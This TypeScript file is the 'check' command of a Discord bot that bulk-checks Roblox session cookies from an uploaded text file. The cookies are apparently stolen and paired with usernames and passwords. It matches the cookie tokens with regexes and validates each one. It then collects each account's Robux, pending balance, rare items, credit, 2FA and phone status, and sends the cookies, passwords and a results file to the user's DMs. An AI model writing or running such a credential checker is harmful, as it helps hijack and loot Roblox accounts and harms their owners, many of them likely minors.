import {
  SlashCommandBuilder,
  type ChatInputCommandInteraction,
  type MessageComponentInteraction,
  MessageFlags,
  AttachmentBuilder,
} from 'discord.js';
import axios from 'axios';
import * as Roblox from '../../lib/roblox-api';
import {
  buildSuccessEmbed,
  buildErrorEmbed,
  buildInvalidCookieEmbed,
  buildIpLimitEmbed,
  buildProgressEmbed,
} from '../../lib/embed-helpers';
import { logger } from '../../lib/logger';
import type { Command } from './types';

const FULL_COOKIE_RE = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_CAEQ[A-Za-z0-9._\-+=\/]+/g;
const BARE_COOKIE_RE = /CAEQ[A-Za-z0-9._\-+=\/]{50,}/g;

function extractCookies(text: string): string[] {
  const fullMatches = [...text.matchAll(FULL_COOKIE_RE)].map((m) => m[0]);
  const fullBareValues = new Set(fullMatches.map((m) => m.slice(m.indexOf('|_CAEQ') + 2)));
  const bareMatches = [...text.matchAll(BARE_COOKIE_RE)]
    .map((m) => m[0])
    .filter((v) => !fullBareValues.has(v));
  const seen = new Set<string>();
  const result: string[] = [];
  for (const full of fullMatches) {
    const bare = full.slice(full.indexOf('|_CAEQ') + 2);
    if (!seen.has(bare)) { seen.add(bare); result.push(full); }
  }
  for (const bare of bareMatches) {
    if (!seen.has(bare)) { seen.add(bare); result.push(bare); }
  }
  return result;
}

const data = new SlashCommandBuilder()
  .setName('check')
  .setDescription('Mass Checking File')
  .addAttachmentOption((opt) =>
    opt.setName('file').setDescription('A .txt file containing cookies').setRequired(true),
  ) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  const startTime = Date.now();

  try {
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    const attachment = interaction.options.getAttachment('file', true);
    if (!attachment.name?.endsWith('.txt') && !attachment.contentType?.includes('text')) {
      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **Invalid File**\n────\n⭑ Please attach a `.txt` file.')] });
      return;
    }

    let fileContent: string;
    try {
      const resp = await axios.get<string>(attachment.url, { responseType: 'text', validateStatus: () => true });
      fileContent = resp.data;
    } catch (err: any) {
      logger.error({ err }, 'File download failed');
      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **Download Failed**\n────\n⭑ Could not fetch the file.')] });
      return;
    }

    const cookies = extractCookies(fileContent);
    if (cookies.length === 0) {
      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **No Cookies Found**\n────\n⭑ File must contain cookie tokens.')] });
      return;
    }

    await interaction.editReply({ embeds: [buildProgressEmbed(`Scanning ${cookies.length} cookie(s)...`)] });

    let validCount = 0;
    let invalidCount = 0;
    let totalRobux = 0;
    let totalPending = 0;
    const outputLines: string[] = [];

    const passwordMap = new Map<string, string>();
    const lines = fileContent.split(/\r?\n/);
    let currentUser = '';
    for (const line of lines) {
      const userMatch = line.match(/^Username:\s*(.+)/i);
      if (userMatch) currentUser = userMatch[1].trim();
      const passMatch = line.match(/^Password:\s*(.+)/i);
      if (passMatch && currentUser) {
        passwordMap.set(currentUser.toLowerCase(), passMatch[1].trim());
      }
    }

    let dataIndex = 0;

    for (const rawCookie of cookies) {
      const validation = await Roblox.validateCookie(rawCookie);
      if (!validation.valid) {
        invalidCount++;
        continue;
      }

      validCount++;
      dataIndex++;
      const userId = String(validation.userId!);
      const username = validation.username!;

      // Checking account information must be read-only. Do not invalidate or
      // rotate the supplied cookie as part of a bulk check.
      const workingCookie = rawCookie;

      const [
        ageData, ageGroup,
        robux, summary, country, email, parental, thumb,
        credit, twoStep, phone, rap,
        pendingRobux, ownedRares,
      ] = await Promise.all([
        Roblox.getUserAge(validation.userId!),
        Roblox.fetchAgeGroup(workingCookie),
        Roblox.fetchRobux(workingCookie, userId),
        Roblox.fetchTransactionTotals(workingCookie, userId),
        Roblox.fetchCountry(workingCookie),
        Roblox.fetchEmailInfo(workingCookie),
        Roblox.fetchParentalControls(workingCookie),
        Roblox.fetchAvatarThumbnail(userId),
        Roblox.fetchCreditBalance(workingCookie),
        Roblox.fetchTwoStepConfig(workingCookie, userId),
        Roblox.fetchPhoneInfo(workingCookie),
        Roblox.fetchRolimonsRAP(userId),
        Roblox.fetchPendingRobux(workingCookie, userId),
        Roblox.getOwnedRareItems(workingCookie, userId),
      ]);

      totalRobux += robux;
      totalPending += pendingRobux;

      const password = passwordMap.get(username.toLowerCase()) || 'N/A';

      const embed = buildSuccessEmbed(
        `\`\`\`\n${workingCookie}\n\`\`\`\n**Username:** ${username}\n**Password:** ${password}`
      );
      if (thumb) embed.setThumbnail(thumb);

      try {
        await interaction.user.send({ embeds: [embed] });
      } catch {
        await interaction.channel?.send({ embeds: [embed] });
      }

      outputLines.push(`Data ${dataIndex}`);
      outputLines.push(`Username: ${username}`);
      outputLines.push(`Password: ${password}`);
      outputLines.push(`UserID: ${userId}`);
      outputLines.push(`Cookie: ${workingCookie}`);
      outputLines.push(`Robux: ${robux}`);
      outputLines.push(`Pending: ${pendingRobux}`);
      outputLines.push(`Country: ${country}`);
      outputLines.push(`RAP: ${rap.rap ?? 'N/A'}`);
      outputLines.push(`Premium: ${rap.premium ? 'Yes' : 'No'}`);
      outputLines.push(`Email: ${email.verified || 'None'}`);
      outputLines.push(`Phone: ${phone.hasPhone ? (phone.verified ? 'Verified' : 'Unverified') : 'No'}`);
      outputLines.push(`2FA: ${[twoStep.email ? 'Email' : '', twoStep.authenticator ? 'Authenticator' : ''].filter(Boolean).join(', ') || 'None'}`);
      outputLines.push(`Rare: ${ownedRares.join(', ') || 'None'}`);
      outputLines.push('');
    }

    const totalCookies = cookies.length;
    const elapsedSeconds = ((Date.now() - startTime) / 1000).toFixed(1);

    const summaryText =
      `✧ **Results**\n────\n⭑ **Total:** ${totalCookies}\n⭑ **Valid:** ${validCount}\n⭑ **Invalid:** ${invalidCount}\n⭑ **Total Robux:** ${totalRobux.toLocaleString()}\n⭑ **Total Pending:** ${totalPending.toLocaleString()}\n⭑ **Time:** ${elapsedSeconds}s`;

    const summaryEmbed = buildSuccessEmbed(summaryText);
    const fileContentOutput = outputLines.join('\n').trim() || 'No valid cookies found.';
    const fileBuffer = Buffer.from(fileContentOutput, 'utf-8');
    const fileAttachment = new AttachmentBuilder(fileBuffer, { name: 'razor_result.txt' });

    await interaction.user.send({
      embeds: [summaryEmbed],
      files: [fileAttachment],
    }).catch(() => interaction.channel?.send({
      embeds: [summaryEmbed],
      files: [fileAttachment],
    }));

    await interaction.editReply({ content: '✅ Results sent to your DMs.', embeds: [] });
  } catch (err: any) {
    logger.error({ err }, 'Check command error');
    try {
      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')] });
    } catch {}
  }
}

async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
}

export const checkCommand: Command = { data, execute, handleButton };